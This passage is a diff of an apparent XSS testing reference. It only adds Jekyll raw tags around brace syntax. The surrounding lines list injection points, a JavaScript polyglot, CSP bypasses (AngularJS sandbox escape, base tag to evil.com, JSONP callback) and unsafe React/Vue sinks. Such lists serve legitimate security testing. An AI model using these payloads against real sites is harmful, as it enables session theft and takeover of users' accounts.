@@ -9,7 +9,7 @@
 - Headers: User-Agent, Referer, X-Forwarded-For
 - Cookies (if reflected)
 - File uploads (filename, metadata)
-- JSON endpoints: {"user":"<payload>"}
+- JSON endpoints: {% raw %}{"user":"<payload>"}{% endraw %}
 - postMessage handlers
 - DOM properties: location.hash, document.referrer
 - WebSocket messages
@@ -97,7 +97,7 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</
 
 <csp_bypasses>
 - JSONP endpoints: <script src="//site.com/jsonp?callback=alert">
-- AngularJS: {{constructor.constructor('alert(1)')()}}
+- AngularJS: {% raw %}{{constructor.constructor('alert(1)')()}}{% endraw %}
 - Script gadgets in allowed libraries
 - Base tag injection: <base href="//evil.com/">
 - Object/embed: <object data="data:text/html,<script>alert(1)</script>">
@@ -145,7 +145,7 @@ navigator.mediaDevices.getUserMedia({video:true}).then(s=>...)
 </markdown>
 
 <react_vue>
-- dangerouslySetInnerHTML={{__html: payload}}
+- dangerouslySetInnerHTML={% raw %}{{__html: payload}}{% endraw %}
 - v-html directive bypass
 </react_vue>
 
